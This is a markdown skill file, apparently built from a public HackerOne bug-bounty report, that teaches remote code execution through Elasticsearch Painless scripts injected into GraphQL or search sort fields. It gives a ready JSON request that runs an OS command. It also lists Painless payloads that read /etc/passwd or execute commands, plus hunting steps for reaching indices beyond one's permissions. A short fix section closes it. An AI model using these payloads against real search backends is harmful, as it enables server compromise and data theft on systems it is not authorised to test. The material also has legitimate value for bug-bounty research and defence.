---
name: elasticsearch-painless-rce
description: RCE via Elasticsearch Painless scripting reached through a GraphQL/search API. Teaches abusing search-engine script/sort injection (Painless/script_score) to execute code and read files.
sources: hackerone_public
report_count: 1
---

# Elasticsearch Painless Script → RCE

**Report**: HackerOne — "Authenticated Elasticsearch Painless script execution via Query.search.sort_query on hackerone.com/graphql" (hackerone.com/reports/3694007, high, $7,000, Code Injection).

## Why it matters (the new lesson)
Search products (Elasticsearch, OpenSearch) accept dynamic scripting (Painless, Groovy, Lucene). If a GraphQL/REST search endpoint forwards a user-controlled field into `script`/`sort`/`script_score`, you get script execution — read arbitrary files, run OS commands, or read indices beyond your permission. GraphQL search + DB is an underexplored RCE surface.

## How it works
```json
{ "query": { "match_all": {} },
  "sort": { "_script": { "type": "number",
     "script": { "lang": "painless", "source": "java.lang.Runtime.getRuntime().exec('id')" } } } }
```
Older ES also used `_source`/`script_fields` and Groovy sandbox escapes (CVE-2015-1427).

## How to hunt for it
1. Find search/sort/filter endpoints (GraphQL search, advanced search, analytics).
2. Inject a `script`/`script_fields`/`sort` with a Painless payload; observe execution or error leakage of internal paths.
3. Enumerate indices (`_cat/indices`) and read sensitive docs.

## Payloads
```painless
"source": "new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter('\\\\Z').next()"
"source": "java.lang.Runtime.getRuntime().exec('id').getText()"
"source": "params._source"   // field disclosure
```

## Fix
Disable dynamic scripting or run sandboxed/allowlisted scripts; never pass user input into script source; least-privilege ES roles; network-isolate ES.
